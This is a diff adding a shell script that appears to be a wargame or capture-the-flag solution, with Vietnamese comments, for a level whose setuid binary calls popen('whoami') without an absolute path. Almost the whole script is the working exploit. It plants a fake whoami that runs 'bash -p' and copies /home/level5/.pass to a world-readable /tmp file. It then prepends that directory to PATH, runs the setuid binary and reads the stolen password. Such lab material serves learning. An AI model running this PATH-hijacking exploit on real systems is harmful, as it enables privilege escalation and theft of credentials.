@@ -1,0 +1,33 @@
+# Level 4 - Payload / Command
+# Lỗ hổng: popen("whoami","r") không dùng đường dẫn tuyệt đối -> PATH hijacking
+# Bản khai thác cuối cùng (đã xử lý cả 3 vấn đề: bash tự hạ quyền, quyền
+# ghi thư mục, race condition qua pipe của popen)
+
+# 1. Đọc source + xác nhận setuid owner
+cat /levels/level04.c
+ls -la /levels/level04*
+
+# 2. Tạo file "whoami" giả - ghi pass trực tiếp ra /tmp (world-writable),
+#    dùng "bash -p" cả 2 lần để KHÔNG bị tự động hạ quyền
+mkdir -p /tmp/toan_lv4
+cd /tmp/toan_lv4
+cat > whoami << 'EOF'
+#!/bin/bash -p
+cat /home/level5/.pass > /tmp/level5_pass_toan.txt
+chmod 644 /tmp/level5_pass_toan.txt
+/bin/bash -p
+EOF
+chmod +x whoami
+
+# 3. Chèn thư mục chứa whoami giả vào đầu PATH, rồi chạy binary setuid
+export PATH=/tmp/toan_lv4:$PATH
+/levels/level04
+
+# 4. Đọc pass - lưu ý: KHÔNG cần quan tâm đang ở shell level4 hay shell đặc
+#    quyền còn sống (có thể có race condition về tty), vì pass đã được ghi
+#    sẵn ra file thế giới đọc được (chmod 644) ngay trong lúc script chạy
+cat /tmp/level5_pass_toan.txt
+
+# CẢNH BÁO: sau khi /levels/level04 thoát, prompt trở về đúng SHELL ĐĂNG NHẬP
+# SSH GỐC. Chỉ gõ "exit" để rời shell con nếu cần, TUYỆT ĐỐI KHÔNG gõ "logout"
+# ở đây vì nó sẽ đóng luôn cả phiên SSH.
